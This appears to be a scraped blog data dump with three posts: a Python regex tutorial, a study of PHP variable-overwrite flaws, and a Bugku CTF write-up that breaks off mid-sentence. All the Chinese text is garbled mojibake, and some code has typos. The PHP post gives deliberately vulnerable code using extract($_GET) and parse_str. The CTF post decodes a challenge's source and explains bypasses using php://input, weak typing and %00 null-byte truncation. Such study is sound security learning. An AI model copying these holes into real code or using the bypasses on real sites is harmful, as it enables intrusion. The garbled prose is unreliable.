- - - - - - - - - - - - - - - - - - - - - - &lt;re.Match object; span=(0, 5), match=&#39;hello&#39;&gt; &lt;re.Match object; span=(0, 11), match=&#39;hello\\nworld&#39;&gt; &lt;re.Match object; span=(0, 11), match=&#39;hello\\nworld&#39;&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &lt;re.Match object; span=(0, 3), match=&#39;foo&#39;&gt; 12345678910111213141516171819202122232425#æ›¿æ¢&#x27;&#x27;&#x27;æ­£åˆ™è¡¨è¾¾å¼å¼•æ“å¹¶ä¸ä»…ä»…å±€é™äºè¯†åˆ«ä¸€ä¸ªæ¨¡å¼æ˜¯å¦åœ¨å­—ç¬¦ä¸²ä¸­å­˜åœ¨ï¼Œå®ƒè¿˜èƒ½å¤Ÿæ‰§è¡Œå­—ç¬¦ä¸²æ›¿æ¢ï¼ŒåŸºäºåœ¨åŸå§‹å­—ç¬¦ä¸²ä¸­çš„åˆ†ç»„è¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ã€‚Pythonä¸­çš„æ›¿æ¢æ–¹æ³•æ˜¯re.subï¼Œä»–æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚åªè¦å®é™…åŒ¹é…è¢«æ›¿æ¢ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…ï¼Œåˆ™re.subæœ€ç»ˆä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚re.subå…è®¸ä»è¢«æ›¿æ¢çš„å­—ç¬¦ä¸²ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä½¿ç”¨åŒæ ·çš„å›æº¯å¼•ç”¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸ªä»ç”µè¯å·ç ä¸­å‰¥ç¦»æ— å…³æ ¼å¼æ•°æ®çš„ä»»åŠ¡&#x27;&#x27;&#x27;a = re.sub(r&#x27;[\\d]+&#x27;,r&#x27;a&#x27;,&#x27;213-667-8890&#x27;)print(a)# è¿˜å¯ä»¥åˆ©ç”¨subçš„åŠŸèƒ½ä½¿æ‰€æœ‰çš„ç”µè¯å·ç æ ¼å¼ä¸€è‡´b = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;213-667-8890&#x27;)c = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;(213)8675509&#x27;)d = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;213.867.5509&#x27;)e = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;+1-213-854-5557&#x27;)f = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;1213-854-5557&#x27;)print(b)print(c)print(d)print(e)print(f) a-a-a (213)667-8890 (213)867-5509 (213)867-5509 (213)854-5557 (213)854-5557 123456789101112131415161718192021222324#å·²ç¼–è¯‘çš„æ­£åˆ™è¡¨è¾¾å¼#reæ¨¡å—åŒ…å«ä¸€ä¸ªå‡½æ•°ï¼šcompileï¼Œå®ƒè¿”å›ä¸€ä¸ªå·²ç¼–è¯‘çš„æ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¹‹åå¯ä»¥è¢«å¤ç”¨regex = re.compile(r&#x27;[\\d]&#123;3,4&#125;&#x27;)a = regex.search(&#x27;578&#x27;)b = regex.search(&#x27;ç¼–å·8975&#x27;)print(a)print(b)&#x27;&#x27;&#x27;ä½¿ç”¨å·²ç¼–è¯‘çš„æ­£åˆ™è¡¨è¾¾å¼æœ‰ä¸¤ä¸ªå¥½å¤„ï¼š å¯ç”¨äºä½œä¸ºæ–¹æ³•çš„å‚æ•°è¢«ä¼ é€’ å…è®¸ä½¿ç”¨åœ¨re.searchå…è®¸ä½¿ç”¨åœ¨re.searchä¸­ä¸å¯ç”¨çš„ä¸¤ä¸ªé¢å¤–å‚æ•°ï¼Œ è¿™ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯è¢«æœç´¢å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“æŸä½ç½®ï¼Œä»–ä»¬å¯ç”¨æ¥å‡å°‘å¯¹éƒ¨åˆ†å­—ç¬¦ä¸²çš„è€ƒè™‘&#x27;&#x27;&#x27;reg = re.compile(&#x27;[\\d]+&#x27;)c = reg.search(&#x27;1 ç¼–å·89757,wuhhhhh&#x27;)d = reg.search(&#x27;1 ç¼–å·89757,wuhhhhh&#x27;,pos=2)#posï¼šåŒ¹é…çš„èµ·å§‹ä½ç½®ï¼Œå¯é€‰ï¼Œé»˜è®¤ä¸º0#endposï¼šåŒ¹é…çš„ç»“æŸä½ç½®ï¼Œå¯é€‰ï¼Œé»˜è®¤ä¸º len(string)print(c)print(d) &lt;re.Match object; span=(0, 3), match=&#39;578&#39;&gt; &lt;re.Match object; span=(2, 6), match=&#39;8975&#39;&gt; &lt;re.Match object; span=(0, 1), match=&#39;1&#39;&gt; &lt;re.Match object; span=(4, 9), match=&#39;89757&#39;&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#æ­£åˆ™è¡¨è¾¾å¼ç»ƒä¹ str=&#x27;&#x27;&#x27;å¼ ä¼Ÿ 86-14870293148 \\n ç‹ä¼Ÿ +86-13285654569 \\n ç‹èŠ³ 15856529115 \\n æä¼Ÿ 13022816340 \\n ç‹ç§€è‹± (86)14785720656 \\n æç§€è‹± 17201444672 \\n æå¨œ 15682812452 \\n å¼ ç§€è‹± 14326967740 \\n åˆ˜ä¼Ÿ 15146435743 \\n å¼ æ• (86)-17712576838 \\n æé™ 86 14295083635 \\n å¼ ä¸½ (+86) 13722348123 \\n ç‹é™ 17587918887 \\n ç‹ä¸½ 15493106739 \\n æå¼º 13786842977 \\n å¼ é™ 86-15542304386 \\n ææ• 15642387356 \\n ç‹æ• 18627216756 \\n ç‹ç£Š 17206185726 \\n æå†› 17857426238 \\n åˆ˜æ´‹ 17345352790 \\n&#x27;&#x27;&#x27;#è¦æ±‚ï¼š# 1.æå–æ‰€æœ‰ 11 ä½æ•°å­—ç”µè¯å·ç # 2.æå–æ‰€æœ‰ 18 æˆ– 13 å¼€å¤´çš„ç”µè¯å·ç # 3.æå–æ‰€æœ‰â€œç‹â€å§“åŒå­¦çš„åå­—# 4.æå–æ‰€æœ‰â€œå¼ â€å§“åŒå­¦çš„ç”µè¯å·ç # 5.é‡æ–°æ’ç‰ˆï¼Œæ’ç‰ˆæˆç»Ÿä¸€çš„æ ¼å¼ï¼Œå»æ‰å›½å®¶åŒºå·ã€‚#1a = re.findall(r&#x27;[\\d]&#123;11&#125;&#x27;,str)#for i in a:# print(i)print(a)print(&quot; -&quot; * 30)#2b = re.findall(r&#x27;1[3|8][\\d]&#123;9&#125;&#x27;,str)print(b)print(&quot; -&quot; * 30)#3c = re.findall(r&#x27;ç‹\\S*&#x27;,str)sprint(c)print(&quot; -&quot; * 30)#4d = re.findall(r&#x27;(å¼ \\S*)\\s+\\(?(\\+?86?)?\\)?[ .-]?([\\d]&#123;11&#125;)&#x27;,str)for line in d: print(line[0]+&quot;çš„ç”µè¯æ˜¯ï¼š&quot;+line[2]) [&#39;14870293148&#39;, &#39;13285654569&#39;, &#39;15856529115&#39;, &#39;13022816340&#39;, &#39;14785720656&#39;, &#39;17201444672&#39;, &#39;15682812452&#39;, &#39;14326967740&#39;, &#39;15146435743&#39;, &#39;17712576838&#39;, &#39;14295083635&#39;, &#39;13722348123&#39;, &#39;17587918887&#39;, &#39;15493106739&#39;, &#39;13786842977&#39;, &#39;15542304386&#39;, &#39;15642387356&#39;, &#39;18627216756&#39;, &#39;17206185726&#39;, &#39;17857426238&#39;, &#39;17345352790&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [&#39;13285654569&#39;, &#39;13022816340&#39;, &#39;13722348123&#39;, &#39;13786842977&#39;, &#39;18627216756&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [&#39;ç‹ä¼Ÿ&#39;, &#39;ç‹èŠ³&#39;, &#39;ç‹ç§€è‹±&#39;, &#39;ç‹é™&#39;, &#39;ç‹ä¸½&#39;, &#39;ç‹æ•&#39;, &#39;ç‹ç£Š&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - å¼ ä¼Ÿçš„ç”µè¯æ˜¯ï¼š14870293148 å¼ ç§€è‹±çš„ç”µè¯æ˜¯ï¼š14326967740 å¼ æ•çš„ç”µè¯æ˜¯ï¼š17712576838 å¼ ä¸½çš„ç”µè¯æ˜¯ï¼š13722348123 å¼ é™çš„ç”µè¯æ˜¯ï¼š15542304386 å‚è€ƒï¼š https://segmentfault.com/a/1190000018622193?utm_source=tag-newest https://deerchao.cn/tutorials/regex/regex.htm","categories":[{"name":"Python","slug":"Python","permalink":"https://bobtaoy.github.io/categories/Python/"}],"tags":[{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://bobtaoy.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"PHPå˜é‡è¦†ç›–å­¦ä¹ ","slug":"PHPå˜é‡è¦†ç›–å­¦ä¹ ","date":"2020-10-04T01:08:31.000Z","updated":"2020-10-04T01:15:35.765Z","comments":true,"path":"2020/10/04/PHPå˜é‡è¦†ç›–å­¦ä¹ /","link":"","permalink":"https://bobtaoy.github.io/2020/10/04/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"æ¦‚è¿° è‡ªå®šä¹‰çš„å‚æ•°å€¼æ›¿æ¢åŸæœ‰å˜é‡å€¼çš„æƒ…å†µç§°ä¸ºå˜é‡è¦†ç›–æ¼æ´ $$**ä½¿ç”¨ä¸å½“ï¼Œextract()å‡½æ•°ä½¿ç”¨ä¸å½“ï¼Œparse_str()å‡½æ•°ä½¿ç”¨ä¸å½“ï¼Œimport_request_variables()**ä½¿ç”¨ä¸å½“ï¼Œå¼€å¯äº†å…¨å±€å˜é‡æ³¨å†Œç­‰ $$ å¯¼è‡´çš„å˜é‡è¦†ç›– $$è¿™ç§å†™æ³•ç§°ä¸ºå¯å˜å˜é‡ 1234567&lt;?php$a = &#x27;b&#x27;;echo $a;echo &#x27;&lt;hr&gt;&#x27;;$b = &#x27;betao.cn&#x27;;echo $$a; // é¦–å…ˆ$a = b; ç„¶å$$a = $b; å› ä¸º$b=&#x27;betao.cn&#x27;ï¼Œæ‰€ä»¥è¿™é‡Œè¾“å‡º&#x27;betao.cn&#x27;?&gt; ä½¿ç”¨foreachæ¥éå†æ•°ç»„ä¸­çš„å€¼ï¼Œç„¶åå†å°†è·å–åˆ°çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„é”®å€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚å› æ­¤å°±äº§ç”Ÿäº†å˜é‡è¦†ç›–æ¼æ´ 12345678910&lt;?php$a = &#x27;123&#x27;; // å®šä¹‰å˜é‡$a,å€¼ä¸º123echo $a; // è¾“å‡ºå€¼foreach ($_GET as $key =&gt; $value) &#123; $&#123;$key&#125; = $value; // è¿™é‡Œå°±æ˜¯æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œé‡æ–°å®šä¹‰äº†å˜é‡$açš„å€¼ // $_GETä¼ å…¥å‚æ•°a,ä½¿$key = a; é‚£ä¹ˆ$&#123;$key&#125; = $a; ç„¶åé‡æ–°å®šä¹‰å€¼ï¼Œä¿®æ”¹äº†åŸæœ‰çš„å€¼&#125;echo &#x27;&lt;hr&gt;&#x27;;echo $a; // è¿™é‡Œå°±è¢«æ”¹å˜äº†?&gt; extract()å‡½æ•°ä½¿ç”¨ä¸å½“ https://www.runoob.com/php/func-array-extract.html å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ï¼Œå³å°†æ•°ç»„ä¸­çš„é”®å€¼å¯¹æ³¨å†Œæˆå‡½æ•°ï¼Œä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ ä»ä»¥ä¸Šè¯´æ˜æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ï¼Œä¼šä¸ä¼šå¯¼è‡´å˜é‡è¦†ç›–æ¼æ´ç”±ç¬¬äºŒä¸ªå‚æ•°å†³å®šï¼Œè¯¥å‡½æ•°æœ‰ä¸‰ç§æƒ…å†µä¼šè¦†ç›–å·²æœ‰å˜é‡ 123456&lt;?php$a = &#x27;123&#x27;; // å®šä¹‰å˜é‡$açš„å€¼ä¸º123$b = array(&#x27;a&#x27; =&gt; &#x27;betao.cn&#x27;); // å®šä¹‰æ•°ç»„extract($b); // æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œæ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼echo $a; // è¾“å‡ºbetao.cn?&gt; æ¼æ´å¤ç°123456789101112&lt;?phpextract($_GET); // GETå˜é‡è¦†ç›–if(isset($bdctf)) //åˆ¤æ–­å˜é‡bdctfæ˜¯å¦å­˜åœ¨&#123;$content=trim(file_get_contents($flag)); //file_get_contentsâ€”å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²//trimâ€”å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰if($bdctf==$content) // è¿™é‡Œéœ€è¦ä½¿å¾—$bdctf==$content&#123; echo&#x27;&#123;betao.cn&#125;&#x27;; &#125;else&#123; echo&#x27;è¿™ä¸æ˜¯è“ç›¾çš„å¯†ç å•Š&#x27;; &#125;&#125;?&gt; ä»£ç åˆ†æï¼šéœ€è¦å­˜åœ¨$bdctfå˜é‡ï¼Œ$bdctf==$contentï¼Œæ‰€ä»¥æˆ‘ä»¬å®šä¹‰?bdctf=&amp;flag=æ‹¿åˆ°flag å…¶ä¸­ï¼Œå› ä¸ºcontentè¯»å–çš„æ˜¯$flagçš„å€¼(æ•°æ®æµ) parse_str()å‡½æ•° https://www.w3school.com.cn/php/func_string_parse_str.asp 1234567&lt;?php$a = &#x27;aaa&#x27;;echo $a;echo &#x27;&lt;hr&gt;&#x27;;parse_str(&quot;a=betao.cn&quot;); //ç»è¿‡parse_str()å‡½æ•°ï¼Œé‡æ–°èµ‹å€¼å˜é‡$a=&#x27;betao.cn&#x27;;echo $a;?&gt; import_request_variables()å‡½æ•° https://www.php.net/manual/zh/function.import-request-variables.php å°† GETï¼POSTï¼Cookie å˜é‡å¯¼å…¥åˆ°å…¨å±€ä½œç”¨åŸŸä¸­, types å‚æ•°æŒ‡å®šéœ€è¦å¯¼å…¥çš„å˜é‡, Gä»£è¡¨GETï¼ŒPä»£è¡¨POSTï¼ŒCä»£è¡¨COOKIE å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šimport_request_variables()å‡½æ•°å‡½æ•°åªèƒ½ç”¨åœ¨ PHP4.1 ~ PHP5.4ä¹‹é—´ï¼Œé¢å¤–ä»¥ä¸Šä¸‰ç§å‡½æ•°ï¼Œä½¿ç”¨æ—¶è¯·æ ¼å¤–æ³¨æ„ï¼Œå¦åˆ™éå¸¸å®¹æ˜“å‡ºç°å˜é‡è¦†ç›–æ¼æ´ æ¼æ´é˜²èŒƒextract()å‡½æ•°é˜²å¾¡ å°†extract.phpä¸­extract()å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°ä¿®æ”¹ä¸ºextr_skip: parse_str()å‡½æ•°é˜²å¾¡ parse_str()å‡½æ•°çš„é˜²èŒƒï¼Œåªèƒ½æˆ‘ä»¬è‡ªå·±æ·»åŠ åˆ¤æ–­è¯­å¥ ,ä¾‹å¦‚: import_request_variables()å‡½æ•°é˜²å¾¡ æ­¤å‡½æ•°æ˜¯éå¸¸å±é™©çš„å‡½æ•°ï¼Œåœ¨PHP5.5ä¹‹åå·²è¢«å®˜æ–¹åˆ é™¤ï¼","categories":[{"name":"PHP","slug":"PHP","permalink":"https://bobtaoy.github.io/categories/PHP/"},{"name":"webå®‰å…¨","slug":"PHP/webå®‰å…¨","permalink":"https://bobtaoy.github.io/categories/PHP/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"phpå®‰å…¨","slug":"phpå®‰å…¨","permalink":"https://bobtaoy.github.io/tags/php%E5%AE%89%E5%85%A8/"}]},{"title":"Bugku-CTF never give up","slug":"Bugku-CTF-never-give-up","date":"2020-10-03T07:15:49.000Z","updated":"2020-10-03T08:35:38.253Z","comments":true,"path":"2020/10/03/Bugku-CTF-never-give-up/","link":"","permalink":"https://bobtaoy.github.io/2020/10/03/Bugku-CTF-never-give-up/","excerpt":"","text":"never give upé¢˜ç›®é“¾æ¥ F12ï¼Œå‘ç°æœ‰ä¸ª1p.html è®¿é—®å‘ç°è¢«é‡å®šå‘äº†Bugkuå®˜ç½‘ï¼Œæˆ‘ä»¬burpæŠ“åŒ…æ‹¦æˆª 1%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E é¦–å…ˆæˆ‘ä»¬å°†é‚£äº›ç™¾åˆ†å·ï¼Œä¹Ÿå°±æ˜¯urlç¼–ç çš„è¿›è¡Œè§£ç ï¼ŒURLè§£ç ä¸º 12&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; &lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;--&gt; è§£ç å®Œäº†ä»¥åï¼Œå‘ç°è¿˜éœ€è¦urlè§£ç  è§£ç åçš„ç»“æœæ•´ç†äº†ä»¥ä¸‹ï¼Œæºä»£ç ä¸º 1234567891011121314151617181920212223242526272829303132333435&lt;?php// &quot;;if(!$_GET[&#x27;id&#x27;]) // é™åˆ¶äº†urléç©ºéé›¶çš„å˜é‡id&#123; header(&#x27;Location: hello.php?id=1&#x27;); exit();&#125;$id=$_GET[&#x27;id&#x27;];$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];// ä»¥ä¸Šå®šä¹‰ä¸‰ä¸ªGETè¯·æ±‚çš„å˜é‡if(stripos($a,&#x27;.&#x27;)) // å˜é‡$a ä¸èƒ½å«æœ‰.&#123; echo &#x27;no no no no no no no&#x27;; return ;&#125;$data = @file_get_contents($a,&#x27;r&#x27;); // è·å–æ•°æ®ï¼Œæ¥è‡ªä¸$aif($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123;// åˆ¤æ–­æ¡ä»¶çš„ä»£ç å¾ˆæœ‰æ„æ€/* 1. $dataå¼±ç­‰äºå­—ç¬¦ä¸²bugku is a nice plateform! 2. $idå¼±ç­‰äºæ•´æ•°å‹0 3. å˜é‡$bçš„é•¿åº¦å¤§äº5 strlen()å‡½æ•°çš„ä½œç”¨æ˜¯åˆ¤æ–­å­—ç¬¦ä¸²çš„é•¿åº¦ 4. å­—ç¬¦ä¸² 1114 è¦ä¸å­—ç¬¦ä¸² 111 è¿æ¥å˜é‡ $b çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ„æˆçš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… 5. $b çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½å¼±ç­‰äºæ•´æ•°4*/ require(&quot;f4l2a3g.txt&quot;); // åŒ…å«æ–‡ä»¶ f4l2a3g.txt&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt; å› ä¸ºæš´éœ²äº†flagæ–‡ä»¶çš„åœ°å€ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®http://123.206.87.240:8006/test/f4l2a3g.txt å³å¯å¾—åˆ°flag ä½†æˆ‘ä»¬éœ€è¦çªç ´çš„æ˜¯åˆ¤æ–­çš„é‚£ä¸€å±‚ï¼Œå¦‚ä½•ç»•è¿‡ æˆ‘ä»¬æ¥ä¸‹æ¥åˆ†æ$a,$b,$idä¸‰ä¸ªå˜é‡ PHPå¼±ç±»å‹æ¯”è¾ƒé¦–å…ˆæˆ‘ä»¬æ¥è¯´ä»¥ä¸‹$idå¼±ç±»å‹,ä»£ç çœ‹æ‡‚é—®é¢˜ å‚è€ƒè¡¨ï¼š https://www.php.net/manual/zh/types.comparisons.php PHPä¼ªåè®®å› ä¸ºæºä»£ç ä¸­å˜é‡$dataæ˜¯ç”±file_get_contents()å‡½æ•°è¯»å–å˜é‡$a,æ‰€ä»¥$aå¿…é¡»ä¸ºæ•°æ®æµ åœ¨è¿™é‡Œ$a=bugku is a nice plateform!æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¼ªåè®®php://æ¥è®¿é—®è¾“å‡ºæ•°æ®åº“, å…¶ä¸­ php://inputå¯ä»¥è®¿é—®åŸå§‹è¯·æ±‚æ•°æ®ä¸­çš„åªè¯»æµã€‚è¿™é‡Œä»¤ $a = php://input ï¼Œå¹¶ä¸”æäº¤çš„æ•°æ®æµä¸ºbugku is a nice plateform! å…³äºPHPæ”¯æŒçš„åè®®è¯¦è§£ï¼ˆå‚è€ƒå®˜ç½‘ï¼‰: https://www.php.net/manual/zh/wrappers.php eregi() æˆªæ–­æ¼æ´è¿™é‡Œæ˜¯æˆ‘ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œæ‰€ä»¥æˆ‘æ‰æƒ³æŠŠè¿™é¢˜åšä¸ªè®°å½•ã€‚ åœ¨PHPä¸­ ereg() å‡½æ•°æˆ– eregi() å‡½æ•°å­˜åœ¨ç©ºå­—ç¬¦æˆªæ–­æ¼æ´ï¼Œå³å‚æ•°ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æˆ–å¾…åŒ¹é…å­—ç¬¦ä¸²é‡åˆ°ç©ºå­—ç¬¦åˆ™æˆªæ–­ä¸¢å¼ƒåé¢çš„æ•°æ® GETè¯·æ±‚ %00 POSTè¯·æ±‚ 0x00 æˆ–è€…æ‰‹åŠ¨ä¿®æ”¹hexæ•°æ®ä¸º00 æºç ä¸­å¾…åŒ¹é…å­—ç¬¦ä¸²ï¼ˆç¬¬äºŒä¸ªå‚æ•°ï¼‰å·²ç¡®å®šä¸º &quot;1114&quot;ï¼Œæ­£åˆ™è¡¨è¾¾å¼ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ç”± &quot;111&quot; è¿æ¥ $b çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç»„æˆï¼Œè‹¥ä»¤ substr($b,0,1) = &quot;\\x00&quot;ï¼Œå³æ»¡è¶³ &quot;1114&quot; ä¸ &quot;111&quot;åŒ¹é… ï¼Œå› æ­¤åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å‡è®¾$b=\\x0012345ä¹Ÿå°±æ»¡è¶³ä»¥ä¸Šä¸‰ä¸ªæ¡ä»¶ï¼ï¼ï¼ PHPé»‘é­”æ³•ï¼š PHPå‡½æ•°é»‘é­”æ³•å°æ€»ç»“ | CTFä¹‹PHPé»‘é­”æ³•æ€»ç»“ FLAGæ¥ä¸‹æ¥æˆ‘ä»¬å°±æ„é€ è¯·æ±‚æ¥æ‹¿flagï¼Œæ³¨æ„ï¼Œå› ä¸ºæˆ‘ä»¬è¿™è¾¹æ˜¯GETè¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨urlç¼–ç çš„â€™%00â€™å³å¯ è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„ $idåªèƒ½ä½¿ç”¨å¼±ç±»å‹ï¼Œä¸èƒ½ç­‰äº0,è™½ç„¶åˆ¤æ–­æ¡ä»¶å“ªé‡Œ==0,ä½†æ˜¯è¢«é‡å®šå‘çš„åˆ¤æ–­é™åˆ¶äº† 12345if(!$_GET[&#39;id&#39;]) &#x2F;&#x2F; é™åˆ¶äº†urléç©ºéé›¶çš„å˜é‡id&#123; header(&#39;Location: hello.php?id&#x3D;1&#39;); exit();&#125; å¦‚æœ$id=0 æ‰€ä»¥æˆ‘ä»¬å¿…é¡»åˆ©ç”¨å¼±ç±»å‹æ‹¿ä¸‹flag,æ³¨æ„ï¼Œè™½ç„¶ b=%0012345 